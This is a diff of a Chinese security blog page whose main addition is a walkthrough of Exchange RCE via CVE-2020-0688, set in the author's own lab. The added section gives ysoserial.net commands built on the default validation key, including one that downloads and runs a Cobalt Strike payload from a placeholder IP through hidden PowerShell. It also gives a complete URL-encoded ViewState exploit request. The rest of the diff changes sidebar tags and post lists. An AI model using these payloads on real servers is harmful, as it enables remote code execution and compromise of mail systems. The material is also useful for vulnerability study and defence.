@@ -93,7 +93,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(102)</small></div></li>
+    <li><div class="all active">全部文章<small>(104)</small></div></li>
     
 </ul>
 <div class="left-bottom">
@@ -105,7 +105,7 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="102">
+<input type="hidden" id="yelog_site_posts_number" value="104">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -196,11 +196,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">代码审计</a>
+        <a class="color3">协议</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">甲方安全</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">代码审计</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -216,11 +220,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">CS插件</a>
+        <a class="color3">CobaltStrike</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">CobaltStrike</a>
+        <a class="color5">CS插件</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -229,6 +233,10 @@
     
     <li class="article-tag-list-item">
         <a class="color5">环境搭建</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Mimikatz</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -276,11 +284,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">应急响应</a>
+        <a class="color3">思考</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">思考</a>
+        <a class="color5">应急响应</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -292,6 +300,22 @@
 
     
     <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2021/01/06/how-to-prevent-mimikatz-attack/"
+           data-tag="内网渗透,Mimikatz"
+           data-author="" >
+            <span class="post-title" title="mimikatz防御方式">mimikatz防御方式</span>
+            <span class="post-date" title="2021-01-06 16:02:31">2021/01/06</span>
+        </a>
+        
+        <a  class=""
+           href="/2021/01/05/Smb-Intro/"
+           data-tag="内网渗透,协议"
+           data-author="" >
+            <span class="post-title" title="Smb协议基础">Smb协议基础</span>
+            <span class="post-date" title="2021-01-05 15:24:53">2021/01/05</span>
+        </a>
         
         <a  class=""
            href="/2021/01/05/A-D-Phishing/"
@@ -1141,7 +1165,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2021-01-04 16:18:29'>2021-01-04 10:15</time>
+        创建时间:<time class="date" title='更新时间: 2021-01-11 14:04:25'>2021-01-04 10:15</time>
         
     </div>
     <div class="article-meta">
@@ -1163,7 +1187,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#定位exchange-server"><span class="toc-text">定位exchange server</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#爆破"><span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruler"><span class="toc-text">Ruler</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取信息"><span class="toc-text">获取信息</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#定位exchange-server"><span class="toc-text">定位exchange server</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#爆破"><span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruler"><span class="toc-text">Ruler</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取信息"><span class="toc-text">获取信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-0688"><span class="toc-text">CVE-2020-0688</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1186,6 +1210,26 @@
 <p>导出邮箱</p>
 <h1 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h1><p>将HTTP版本主机修改成1.0<br>去掉HOST头，可获取内网ip地址<br><img src="/2021/01/04/exchange-pentent/ip.png" alt></p>
 <p>使用nmap脚本获取主机信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll</span><br></pre></td></tr></table></figure></p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><p>漏洞影响如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010 Service Pack 3</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure></p>
+<p>这个漏洞是2020年3月份出的漏洞，所以在这之前的小版本都没有</p>
+<p>我这里安装的为 <strong>Exchange Server 2016 CU14</strong> ， 发布日期是在 2019 年 9 月 17 日</p>
+<p><a href="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/" title="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/">环境搭建链接</a></p>
+<p>漏洞利用的前提是要获取一个Exchange的邮箱用户，我这里使用mail/Aa123456账号举例子</p>
+<p>首先，可以使用<a href="https://github.com/zcgonvh/CVE-2020-0688" title="https://github.com/zcgonvh/CVE-2020-0688" target="_blank" rel="noopener">平头哥的工具</a>进行探测探测出存在漏洞</p>
+<p><img src="/2021/01/04/exchange-pentent/vul.png" alt></p>
+<p>接下来需要构造我们反序列化的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--validationalg = SHA1（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--generator=B97B4E27（基本默认）</span><br><span class="line"></span><br><span class="line">--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</span><br></pre></td></tr></table></figure></p>
+<p>除了viewstateuserkey这个值我们需要获取，其实其他的值基本上为默认的，无需改变</p>
+<p>登陆我们域用户的邮箱，请求 /ecp/default.aspx </p>
+<p><img src="/2021/01/04/exchange-pentent/default.png" alt></p>
+<p>可以在我们请求中看到cookie值，我们需要cookie中的ASP.NET_SessionId值</p>
+<p>接下来使用ysoserial.net构造反序列化内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#调用计算器</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#写入文件</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c echo test &gt; C:\1.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#判断出网</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping xxx.dnslog.io&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#反弹CS</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://xx.xx.xx.xx/a&apos;))&quot;  --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p>
+<p>将生成的反序列化内容进行url编码，最终构造出的url如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2fwEylAcAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8%2bDQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2bDQo8L09iamVjdERhdGFQcm92aWRlcj4LiS1M1wqJue%2b7G01o9Xv39is4dIc%3d</span><br></pre></td></tr></table></figure></p>
+<p>访问url，报错500，其实成功<br><img src="/2021/01/04/exchange-pentent/500.png" alt></p>
+<p>登陆Exchange邮服，成功调用calc.exe</p>
+<p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/228735.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/228735.html</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 sher10cksec@foxmail.com </span>
@@ -1199,7 +1243,7 @@
     
     <p><span class="copy-title">本文作者:</span><a  title="sher10ck">sher10ck</a></p>
     <p><span class="copy-title">发布时间:</span>2021-01-04, 10:15:08</p>
-    <p><span class="copy-title">最后更新:</span>2021-01-04, 16:18:29</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-11, 14:04:25</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/01/04/exchange-pentent/" title="exchange基础渗透">http://sherlocz.github.io/2021/01/04/exchange-pentent/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1244,7 +1288,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#爬虫','#钓鱼','#漏洞复现','#JAVA','#反汇编','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#注入','#免杀','#代码审计','#甲方安全','#权限维持','#Python','#工具','#CS插件','#CobaltStrike','#exchange','#环境搭建','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#disable_function','#msf','#逆向','#应急响应','#思考','#译文',],
+            'data': ['#爬虫','#钓鱼','#漏洞复现','#JAVA','#反汇编','#内网渗透','#汇编','#实战','#提权','#主机漏洞','#注入','#免杀','#协议','#甲方安全','#代码审计','#权限维持','#Python','#工具','#CobaltStrike','#CS插件','#exchange','#环境搭建','#Mimikatz','#域渗透','#bypass','#密码抓取','#批量','#CSharp','#Sqlmap','#汇总','#后渗透','#disable_function','#msf','#逆向','#思考','#应急响应','#译文',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
